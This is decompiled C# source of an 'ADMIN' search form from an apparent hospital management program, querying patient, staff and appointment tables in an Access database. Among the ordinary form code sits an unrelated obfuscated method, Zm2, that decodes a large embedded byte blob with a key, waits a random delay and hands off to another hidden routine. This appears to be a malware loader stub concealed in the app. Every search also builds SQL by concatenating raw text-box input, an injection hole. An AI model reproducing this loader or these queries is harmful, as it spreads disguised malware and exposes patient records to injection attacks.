		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)FlowLayoutPanel4);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)FlowLayoutPanel2);
		((Control)this).get_Controls().Add((Control)(object)FlowLayoutPanel1);
		((Control)this).set_Name("Form12");
		((Form)this).set_Text("ADMIN");
		((Control)FlowLayoutPanel1).ResumeLayout(false);
		((Control)FlowLayoutPanel4).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void t7Q(object sender, EventArgs e)
	{
		string currentDirectory = Directory.GetCurrentDirectory();
		currentDirectory = Directory.GetParent(currentDirectory)!.ToString();
		currentDirectory = Directory.GetParent(currentDirectory)!.ToString();
		string connectionString = "provider=microsoft.ACE.OLEDB.12.0 ; data source = " + currentDirectory + "\\hms_Database.accdb";
		con.set_ConnectionString(connectionString);
	}

	private void Wy7()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		con.Open();
		DataTable dataTable = new DataTable();
		OleDbDataAdapter val = new OleDbDataAdapter();
		if (Operators.CompareString(ComboBox1.get_Text(), "NAME", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Patient_DataBase where Name like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else
		{
			val = new OleDbDataAdapter("Select * from Patient_DataBase where ID like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = dataTable.Rows.GetEnumerator();
			IEnumerator enumerator2 = default(IEnumerator);
			while (enumerator.MoveNext())
			{
				DataRow dataRow = (DataRow)enumerator.Current;
				Ns6 ns = new Ns6();
				try
				{
					enumerator2 = dataTable.Columns.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataColumn dataColumn = (DataColumn)enumerator2.Current;
						if (Operators.CompareString(dataColumn.ColumnName, "Name", false) == 0)
						{
							((ButtonBase)ns).set_Text(((ButtonBase)ns).get_Text() + "              NAME   :   " + dataRow[dataColumn].ToString());
						}
						if (Operators.CompareString(dataColumn.ColumnName, "ID", false) == 0)
						{
							((ButtonBase)ns).set_Text("     ID   :   " + dataRow[dataColumn].ToString());
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				((Control)FlowLayoutPanel2).get_Controls().Add((Control)(object)ns);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		con.Close();
	}

	private void g5S()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		con.Open();
		DataTable dataTable = new DataTable();
		OleDbDataAdapter val = new OleDbDataAdapter();
		if (Operators.CompareString(ComboBox1.get_Text(), "NAME", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Doctor_DataBase where Doc_Name like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else
		{
			val = new OleDbDataAdapter("Select * from Doctor_DataBase where ID like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = dataTable.Rows.GetEnumerator();
			IEnumerator enumerator2 = default(IEnumerator);
			while (enumerator.MoveNext())
			{
				DataRow dataRow = (DataRow)enumerator.Current;
				Ns6 ns = new Ns6();
				try
				{
					enumerator2 = dataTable.Columns.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataColumn dataColumn = (DataColumn)enumerator2.Current;
						if (Operators.CompareString(dataColumn.ColumnName, "Doc_Name", false) == 0)
						{
							((ButtonBase)ns).set_Text(((ButtonBase)ns).get_Text() + "              NAME   :   " + dataRow[dataColumn].ToString());
						}
						if (Operators.CompareString(dataColumn.ColumnName, "ID", false) == 0)
						{
							((ButtonBase)ns).set_Text("     ID   :   " + dataRow[dataColumn].ToString());
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				((Control)FlowLayoutPanel2).get_Controls().Add((Control)(object)ns);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		con.Close();
	}

	private void Fg5()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		con.Open();
		DataTable dataTable = new DataTable();
		OleDbDataAdapter val = new OleDbDataAdapter();
		if (Operators.CompareString(ComboBox1.get_Text(), "NAME", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Pharmacist_DataBase where Phar_Name like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else
		{
			val = new OleDbDataAdapter("Select * from Pharmacist_DataBase where ID like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = dataTable.Rows.GetEnumerator();
			IEnumerator enumerator2 = default(IEnumerator);
			while (enumerator.MoveNext())
			{
				DataRow dataRow = (DataRow)enumerator.Current;
				Ns6 ns = new Ns6();
				try
				{
					enumerator2 = dataTable.Columns.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataColumn dataColumn = (DataColumn)enumerator2.Current;
						if (Operators.CompareString(dataColumn.ColumnName, "Phar_Name", false) == 0)
						{
							((ButtonBase)ns).set_Text(((ButtonBase)ns).get_Text() + "              NAME   :   " + dataRow[dataColumn].ToString());
						}
						if (Operators.CompareString(dataColumn.ColumnName, "ID", false) == 0)
						{
							((ButtonBase)ns).set_Text("     ID   :   " + dataRow[dataColumn].ToString());
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				((Control)FlowLayoutPanel2).get_Controls().Add((Control)(object)ns);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		con.Close();
	}

	internal static void Zm2()
	{
		byte[] array = Xg0.Yw1(133632);
		checked
		{
			int eo = Conversions.ToInteger(Jw8.mDic[Jw8.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Ry6.Bc0(array[i], (byte[])Jw8.mDic[Jw8.sArray], eo, i);
			}
			Jw8.mDic.Add(Jw8.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Wx18.z3G1();
		}
	}

	private void Ja5()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		con.Open();
		DataTable dataTable = new DataTable();
		OleDbDataAdapter val = new OleDbDataAdapter();
		if (Operators.CompareString(ComboBox1.get_Text(), "NAME", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Nurse_DataBase where Nurse_Name like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else
		{
			val = new OleDbDataAdapter("Select * from Nurse_DataBase where ID like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = dataTable.Rows.GetEnumerator();
			IEnumerator enumerator2 = default(IEnumerator);
			while (enumerator.MoveNext())
			{
				DataRow dataRow = (DataRow)enumerator.Current;
				Ns6 ns = new Ns6();
				try
				{
					enumerator2 = dataTable.Columns.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataColumn dataColumn = (DataColumn)enumerator2.Current;
						if (Operators.CompareString(dataColumn.ColumnName, "Nurse_Name", false) == 0)
						{
							((ButtonBase)ns).set_Text(((ButtonBase)ns).get_Text() + "              NAME   :   " + dataRow[dataColumn].ToString());
						}
						if (Operators.CompareString(dataColumn.ColumnName, "ID", false) == 0)
						{
							((ButtonBase)ns).set_Text("     ID   :   " + dataRow[dataColumn].ToString());
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				((Control)FlowLayoutPanel2).get_Controls().Add((Control)(object)ns);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		con.Close();
	}

	private void x6C()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		con.Open();
		DataTable dataTable = new DataTable();
		OleDbDataAdapter val = new OleDbDataAdapter();
		if (Operators.CompareString(ComboBox1.get_Text(), "NAME", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Laboratorist_DataBase where Lab_Name like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else
		{
			val = new OleDbDataAdapter("Select * from Laboratorist_DataBase where ID like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = dataTable.Rows.GetEnumerator();
			IEnumerator enumerator2 = default(IEnumerator);
			while (enumerator.MoveNext())
			{
				DataRow dataRow = (DataRow)enumerator.Current;
				Ns6 ns = new Ns6();
				try
				{
					enumerator2 = dataTable.Columns.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataColumn dataColumn = (DataColumn)enumerator2.Current;
						if (Operators.CompareString(dataColumn.ColumnName, "Lab_Name", false) == 0)
						{
							((ButtonBase)ns).set_Text(((ButtonBase)ns).get_Text() + "              NAME   :   " + dataRow[dataColumn].ToString());
						}
						if (Operators.CompareString(dataColumn.ColumnName, "ID", false) == 0)
						{
							((ButtonBase)ns).set_Text("     ID   :   " + dataRow[dataColumn].ToString());
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				((Control)FlowLayoutPanel2).get_Controls().Add((Control)(object)ns);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		con.Close();
	}

	private void a4L()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Expected O, but got Unknown
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		con.Open();
		DataTable dataTable = new DataTable();
		OleDbDataAdapter val = new OleDbDataAdapter();
		if (Operators.CompareString(ComboBox1.get_Text(), "DOCTOR_NAME", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Appointment_DataBase where Doctor_Name like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else if (Operators.CompareString(ComboBox1.get_Text(), "PATIENT_NAME", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Appointment_DataBase where Patient_Name like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else if (Operators.CompareString(ComboBox1.get_Text(), "Department", false) == 0)
		{
			val = new OleDbDataAdapter("Select * from Appointment_DataBase where Department like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		else
		{
			val = new OleDbDataAdapter("Select * from Appointment_DataBase where Patient_ID like '%" + TextBox1.get_Text() + "%' ", con);
			((DbDataAdapter)(object)val).Fill(dataTable);
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = dataTable.Rows.GetEnumerator();
			IEnumerator enumerator2 = default(IEnumerator);
			while (enumerator.MoveNext())
			{
				DataRow dataRow = (DataRow)enumerator.Current;
				Ns6 ns = new Ns6();
				try
				{
					enumerator2 = dataTable.Columns.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						DataColumn dataColumn = (DataColumn)enumerator2.Current;
						if (Operators.CompareString(dataColumn.ColumnName, "Patient_Name", false) == 0)
						{
							((ButtonBase)ns).set_Text(((ButtonBase)ns).get_Text() + "                PATIENT NAME   :   " + dataRow[dataColumn].ToString());
						}
						if (Operators.CompareString(dataColumn.ColumnName, "ID", false) == 0)
						{
							((ButtonBase)ns).set_Text("     ID   :   " + dataRow[dataColumn].ToString());
						}
						if (Operators.CompareString(dataColumn.ColumnName, "Doctor_Name", false) == 0)
						{
							((ButtonBase)ns).set_Text(((ButtonBase)ns).get_Text() + "                 DOCTOR NAME   :   " + dataRow[dataColumn].ToString());
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				((Control)FlowLayoutPanel2).get_Controls().Add((Control)(object)ns);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		con.Close();
	}

	private void Ss1(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		Button val = (Button)sender;
		Label1.set_Text("SEARCH " + ((ButtonBase)val).get_Text() + " BY");
		((Control)ComboBox1).set_Enabled(true);
		ComboBox1.get_Items().Clear();
		ComboBox1.get_Items().Add((object)"NAME");
		ComboBox1.get_Items().Add((object)"ID_number");
		ComboBox1.set_Text("ID_number");
		((Control)TextBox1).set_Enabled(true);
		Flag_select = ((ButtonBase)val).get_Text();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((Control)FlowLayoutPanel4).get_Controls().GetEnumerator();
			while (enumerator.MoveNext())
			{
				Button val2 = (Button)enumerator.Current;
				((ButtonBase)val2).set_BackColor(SystemColors.GradientActiveCaption);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		((ButtonBase)val).set_BackColor(Color.LightBlue);
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		search_flag = 0;
		if (Operators.CompareString(((ButtonBase)val).get_Text(), "Patients", false) == 0)
		{
			Wy7();
		}
		else if (Operators.CompareString(((ButtonBase)val).get_Text(), "Doctors", false) == 0)
		{
			g5S();
		}
		else if (Operators.CompareString(((ButtonBase)val).get_Text(), "Pharmacists", false) == 0)
		{
			Fg5();
		}
		else if (Operators.CompareString(((ButtonBase)val).get_Text(), "Nurses", false) == 0)
		{
			Ja5();
		}
		else if (Operators.CompareString(((ButtonBase)val).get_Text(), "Laboratorists", false) == 0)
		{
			x6C();
		}
	}

	private void m0K(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		Button val = (Button)sender;
		Label1.set_Text("SEARCH " + ((ButtonBase)val).get_Text() + " BY");
		((Control)ComboBox1).set_Enabled(true);
		ComboBox1.get_Items().Clear();
		ComboBox1.get_Items().Add((object)"DOCTOR_NAME");
		ComboBox1.get_Items().Add((object)"PATIENT_NAME");
		ComboBox1.get_Items().Add((object)"Appointment_number");
		ComboBox1.get_Items().Add((object)"Department");
		ComboBox1.set_Text("Appointment_number");
		((Control)TextBox1).set_Enabled(true);
		Flag_select = ((ButtonBase)val).get_Text();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((Control)FlowLayoutPanel4).get_Controls().GetEnumerator();
			while (enumerator.MoveNext())
			{
				Button val2 = (Button)enumerator.Current;
				((ButtonBase)val2).set_BackColor(SystemColors.GradientActiveCaption);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		((ButtonBase)val).set_BackColor(Color.LightBlue);
		((Control)FlowLayoutPanel2).get_Controls().Clear();
		search_flag = 0;
		a4L();
	}

	private void Em7(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		Button val = (Button)sender;
		if (Operators.CompareString(((ButtonBase)val).get_Text(), "Add nurse", false) == 0)
		{
			Rg8.Forms.Form13.GroupBox1.set_Text("Nurse Information");
		}
		else
		{
			Rg8.Forms.Form13.GroupBox1.set_Text("Laboratorist Information");
		}
		((Control)Rg8.Forms.Form13).Show();
	}

	private void m6T(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form14).Show();
	}

	private void z6H(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form15).Show();
	}

	private void Hi7(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form23).Show();
	}

	private void b7Z(object sender, EventArgs e)
	{
		search_flag = 1;
		if (Operators.CompareString(Flag_select, "Appointments", false) == 0)
		{
			a4L();
		}
		else if (Operators.CompareString(Flag_select, "Doctors", false) == 0)
		{
			g5S();
		}
		else if (Operators.CompareString(Flag_select, "Patients", false) == 0)
		{
			Wy7();
		}
		else if (Operators.CompareString(Flag_select, "Nurses", false) == 0)
		{
			Ja5();
		}
		else if (Operators.CompareString(Flag_select, "Pharmacists", false) == 0)
		{
			Fg5();
		}
	}

	private void Sj3(object sender, EventArgs e)
	{
		((TextBoxBase)TextBox1).Clear();
	}

	private void d2Y(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form18).Show();
	}

	private void y5C(object sender, EventArgs e)
	{
	}

	private void g5L(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form22).Show();
	}

	private void m3P(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form20).Show();
	}

	private void Be5(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form31).Show();
	}

	private void t9Y(object sender, EventArgs e)
	{
		((Control)Rg8.Forms.Form24).Show();
	}

	private void i0M(object sender, EventArgs e)
	{
	}
}
